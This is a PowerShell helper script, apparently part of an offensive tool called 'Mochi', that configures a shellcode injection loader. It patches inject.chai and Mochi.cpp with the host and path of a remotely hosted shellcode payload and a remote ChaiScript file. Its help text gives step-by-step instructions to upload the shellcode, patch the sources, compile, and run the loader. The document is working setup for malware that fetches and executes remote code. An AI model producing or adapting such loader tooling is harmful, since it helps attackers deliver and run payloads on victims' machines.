param(
    [Parameter()]
    [uri]$scriptUrl,

    [Parameter()]
    [uri]$payloadUrl,

    [Parameter()]
    [switch]$help
)

if ($help.IsPresent) {
    Write-Host "inject.chai Script Init Steps"
    Write-Host "=============================`n"
    Write-Host "Step 1: Upload your shellcode payload to a remote location."
    Write-Host "Step 2: From the root directory of the project, execute:`n`n.\helper_scripts\init_chaiscript_inject_module.ps1 -payloadUrl `"https://example.com/shellcode.bin`"`n"
    Write-Host "Step 3: Upload the modified inject.chai file to a remote location."
    Write-Host "Step 4: From the root directory of the project, execute:`n`n.\helper_scripts\init_chaiscript_inject_module.ps1 -scriptUrl `"https://example.com/inject.chai`"`n"
    Write-Host "Step 5: Compile Mochi in the Visual Studio project and execute binary to validate successful init.`n"
}

if ([bool]$payloadUrl) {
    # Get inject.chai script code for modification with shellcode payload remote location
    $ChaiScriptSourceCode = Get-Content "Mochi\scripts\inject.chai"
    Write-Host "`n[+] Modifying ChaiScript inject.chai file source code with shellcode payload remote location...`n"

    $payloadHostname = $payloadUrl.Host
    $payloadPath = $payloadUrl.PathAndQuery

    # Add in the shellcode payload binary URL
    $ChaiScriptSourceCode = $ChaiScriptSourceCode -replace "var payloadHostname = `".*`";", "var payloadHostname = `"$($payloadHostname)`";"
    $ChaiScriptSourceCode = $ChaiScriptSourceCode -replace "var payloadPath = `".*`";", "var payloadPath = `"$($payloadPath)`";"
    $ChaiScriptSourceCode | Set-Content "Mochi\scripts\inject.chai"
}

if ([bool]$scriptUrl) {
    # Get source code for modification with ChaiScript file remote location
    $MochiSourceCode = Get-Content "Mochi\Mochi.cpp"
    Write-Host "`n[+] Modifying Mochi.cpp source code with ChaiScript remote location...`n"

    $scriptHostname = $scriptUrl.Host
    $scriptPath = $scriptUrl.PathAndQuery

    # Add in the ChaiScript file URL
    $MochiSourceCode = $MochiSourceCode -replace "std::string scriptHostname = `".*`";", "std::string scriptHostname = `"$($scriptHostname)`";"
    $MochiSourceCode = $MochiSourceCode -replace "std::string scriptPath = `".*`";", "std::string scriptPath = `"$($scriptPath)`";"
    $MochiSourceCode | Set-Content "Mochi\Mochi.cpp"
}
